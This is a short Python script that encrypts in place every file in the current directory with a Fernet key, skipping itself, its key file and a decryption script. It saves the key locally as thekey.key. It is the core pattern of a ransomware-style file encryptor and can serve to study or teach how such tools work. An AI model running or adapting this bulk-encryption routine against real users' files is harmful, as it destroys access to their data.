#!usr/bin/env python3

import os
from cryptography.fernet import Fernet # library to encrypt the file.

#this command is to find all the files in the drive

files = []

# to list all the files in the directory

for file in os.listdir():
	if file == "Encryption.py" or file == "thekey.key" or file == "Decryption.py": # Condition to avoid the files not to encrypt
		continue
	if os.path.isfile(file): # this condition to make sure it only encrypts the file and not the directory
		files.append(file)
print("Files that are getting encrypted :")
print(files) # printing thr lit of files.


key = Fernet.generate_key()  # generating the key ffor encrypting the file

with open("thekey.key","wb") as thekey:
	thekey.write(key)

# loops to encrypt all the files in the directory.

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file,"wb") as thefile:
		thefile.write(contents_encrypted)

print("Encryption Completed") 


